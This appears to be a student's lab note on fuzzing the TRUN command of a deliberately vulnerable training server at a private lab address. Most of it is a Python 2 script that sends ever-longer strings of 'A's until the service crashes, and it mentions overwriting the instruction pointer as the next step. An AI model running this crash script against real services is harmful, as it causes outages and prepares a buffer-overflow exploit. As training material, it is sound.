Fuzzing 

    Once we find what is vuln fuzzing is attacking the command specifically  

    This script sends a bunch of A's and returns how many it takes to crash the server  

    #!/usr/bin/python 

    import sys, socket 

    from time import sleep 

      

    buffer = "A" * 100 

      

    while True: 

            try: 

                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

                    s.connect(('10.0.2.4',9999)) 

      

                    s.send(('TRUN /.:/' + buffer)) 

                    s.close() 

                    sleep(1) 

                    buffer = buffer + "A"*100 

      

            except: 

                    print "Fuzzing crashed at %s bytes" % str(len(buffer)) 

                    sys.exit() 

    Once the vuln server crashes you know what it will take to cause the crash 

    Next we will find the offset to find the exact place where to overwrite the ELP 